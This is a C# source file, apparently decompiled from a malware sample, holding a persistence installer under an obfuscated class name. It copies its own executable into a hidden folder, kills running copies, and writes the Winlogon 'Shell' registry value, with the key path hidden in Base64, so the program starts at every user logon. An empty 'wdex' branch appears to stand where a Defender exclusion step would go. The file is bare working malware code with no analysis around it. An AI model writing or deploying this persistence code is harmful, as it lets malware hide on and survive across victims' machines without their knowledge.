using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

public static class unnokw_at
{
	public static FileInfo FileName;

	public static DirectoryInfo DirectoryName;

	public static void Run(string path, string folder, string filename, string wdex)
	{
		FileName = new FileInfo(filename);
		if (path == "0")
		{
			DirectoryName = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), folder));
		}
		if (path == "1")
		{
			DirectoryName = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), folder));
		}
		if (path == "2")
		{
			DirectoryName = new DirectoryInfo(Path.Combine(Path.GetTempPath(), folder));
		}
		if (IsInstalled())
		{
			return;
		}
		try
		{
			CreateDirectory();
			InstallFile();
			InstallRegistry();
			if (wdex == "True")
			{
				try
				{
					return;
				}
				catch
				{
					return;
				}
			}
		}
		catch
		{
		}
	}

	public static bool IsInstalled()
	{
		if (Application.ExecutablePath == Path.Combine(DirectoryName.FullName, FileName.Name))
		{
			return true;
		}
		return false;
	}

	public static void CreateDirectory()
	{
		if (!DirectoryName.Exists)
		{
			DirectoryName.Create();
		}
		DirectoryName.Attributes = FileAttributes.Hidden;
	}

	public static void InstallFile()
	{
		string text = Path.Combine(DirectoryName.FullName, FileName.Name);
		if (FileName.Exists)
		{
			Process[] processes = Process.GetProcesses();
			Process[] array = processes;
			foreach (Process process in array)
			{
				try
				{
					if (process.MainModule.FileName == text)
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			File.Delete(text);
			Thread.Sleep(250);
		}
		using FileStream fileStream = new FileStream(text, FileMode.Create, FileAccess.Write);
		byte[] array2 = File.ReadAllBytes(Application.ExecutablePath);
		fileStream.Write(array2, 0, array2.Length);
	}

	public static void InstallRegistry()
	{
		if (GetRegKey() == null)
		{
			byte[] bytes = Convert.FromBase64String("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb25c");
			string @string = Encoding.UTF8.GetString(bytes);
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(@string);
			registryKey.SetValue("Shell", "explorer.exe, " + Path.Combine(DirectoryName.FullName, FileName.Name));
			registryKey.Close();
		}
		else if (!GetRegKey().Contains(Path.Combine(DirectoryName.FullName, FileName.Name)))
		{
			string text = GetRegKey().Substring(GetRegKey().Length - 1, 1);
			text = ((!(text == ",")) ? (GetRegKey() + "," + Path.Combine(DirectoryName.FullName, FileName.Name) + ",") : (GetRegKey() + Path.Combine(DirectoryName.FullName, FileName.Name) + ","));
			byte[] bytes2 = Convert.FromBase64String("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb24=");
			string string2 = Encoding.UTF8.GetString(bytes2);
			Registry.CurrentUser.OpenSubKey(string2, writable: true).SetValue("Shell", text);
		}
	}

	public static string GetRegKey()
	{
		try
		{
			byte[] bytes = Convert.FromBase64String("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb25c");
			string @string = Encoding.UTF8.GetString(bytes);
			return Registry.CurrentUser.OpenSubKey(@string).GetValue("Shell").ToString();
		}
		catch
		{
			return null;
		}
	}
}
